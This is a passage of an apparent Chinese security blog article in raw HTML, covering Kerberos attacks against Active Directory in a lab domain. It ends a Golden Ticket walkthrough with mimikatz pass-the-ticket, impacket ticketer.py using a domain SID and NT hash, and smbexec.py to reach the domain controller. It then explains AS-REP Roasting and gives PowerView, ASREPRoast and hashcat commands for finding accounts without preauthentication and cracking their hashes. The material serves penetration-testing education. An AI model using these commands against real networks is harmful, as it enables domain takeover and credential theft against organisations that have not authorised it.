Arial, sans-serif;letter-spacing: 0.1em;">生成文件gold.kirbi<br style="-webkit-tap-highlight-color: transparent;"  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">导入Golden Ticket，执行命令：</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ptt C</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\Users\jack</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0DAY</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\Desktop\gold</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kirbi</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">获得域控权限<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.48538961038961037" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/10_du7iavESYK3nx722RajXc04eyiaP3g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIM854h9gJUpBhaSFDWZc6SImlHTdu7iavESYK3nx722RajXc04eyiaP3g/640?wx_fmt=png'" data-type="png" data-w="1232" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">注意这里格式只能是 主机名.域名 的形式，而不能写ip</strong><br style="-webkit-tap-highlight-color: transparent;"  /><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;"></strong></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">2.使用impacket</strong><br style="-webkit-tap-highlight-color: transparent;"  />这里使用kali，不在域内只需要把dns改为域控即可<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.35124508519003933" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/11_FJK9kvsTmNmAiaZzEN0RTWh0Bn3K9w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIlNcCTl8KIBONzBqMUiaGgdqMjXFJK9kvsTmNmAiaZzEN0RTWh0Bn3K9w/640?wx_fmt=png'" data-type="png" data-w="763" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p><br style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal; "  /><br style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal; "  /><span style=" color: rgb(0, 0, 0); text-align: start; ">先生成票据administrator.ccache ``` python3 ticketer.py -domain-sid S-1-5-21-1812960810-2335050734-3517558805 -nthash 36f9d9e6d98ecf8307baf4f46ef842a2 -domain 0day.org administrator ```</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />导入票据</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">export</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> KRB5CCNAME</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">administrator</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ccache</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后在访问域控</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">python3 smbexec</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">py </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">no</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">pass</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">k OWA2010SP3</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/12_VdYia1QkficB4nPux1EByA8qgczicQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIaUIBTvEx9VvwYZDcthJJhxn5GgEVdYia1QkficB4nPux1EByA8qgczicQ/640?wx_fmt=png'" data-type="png" data-w="640" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">2.AS-REP Roasting</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">在AS-REP阶段，最外层的 enc-part 是用用户密码 Hash 加密的。对于域用户，如果设置了选项” Do not require Kerberos preauthentication”，此时向域控制器的 88 端口发送 AS_REQ 请求，对收到的AS_REP内容(enc-part底下的ciper，因为这部分是使用用户 hash 加密的 Login Session Key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令，这就造成了 AS-REP Roasting攻击。<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="1.0910780669144982" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/13_cXR280Z8rK0VyibGaYzX04IITh19ww.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIKrfFtDXa0vSRuOthNKMlEkRlvcXR280Z8rK0VyibGaYzX04IITh19ww/640?wx_fmt=png'" data-type="png" data-w="538" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />默认这个功能是不启用的，如果启用AS-REP会返回用户hash加密的sessionkey-as，这样我们就可以用john离线破解<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8597826086956522" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/14_qZUhYF7p0wdibRiazFmic27cH79EjQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaImLGoAKoynQR4kQGSJo6kbxdQOKeqZUhYF7p0wdibRiazFmic27cH79EjQ/640?wx_fmt=png'" data-type="png" data-w="920" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />使用Empire下的powerview.ps1查找域中设置了 "不需要kerberos预身份验证" 的用户</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Import</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Module</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\powerview</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ps1</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">DomainUser</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">PreauthNotRequired</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.1842346471127406" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/15_xfPu9uek2VssEtZqozk41Gcpv5pOcQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaItXoRhdoVS6iapiczCLKn8uzx1pxfPu9uek2VssEtZqozk41Gcpv5pOcQ/640?wx_fmt=png'" data-type="png" data-w="1091" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />使用ASREPRoast.ps1获取AS-REP返回的Hash</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Import</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Module</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\A</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">SREPRoast</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ps1</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ASREPHash</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">UserName</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> jack </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Domain</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">|</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Out</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">File</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Encoding</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> ASCII hash</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">txt</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5680304471931494" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/16_ichPibaTtk7E8Rfoj2buGU2IstwEzg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIe2JkMd9SRZTibU5jtPdiapDcM2CtichPibaTtk7E8Rfoj2buGU2IstwEzg/640?wx_fmt=png'" data-type="png" data-w="1051" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />修改为hashcat能识别的格式，在$krb5asrep后面添加$23拼接</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&nbsp;hashcat </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">m </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">18200</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> hash</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">txt </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">pass</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">txt </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">--</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">force</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.35358255451713394" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/17_jExJqekwGcmyGmsaF6TBULz7UvYywA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI3dODytcLafhRpxAWYBdwMQLnjExJqekwGcmyGmsaF6TBULz7UvYywA/640?wx_fmt=png'" data-type="png" data-w="642" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang 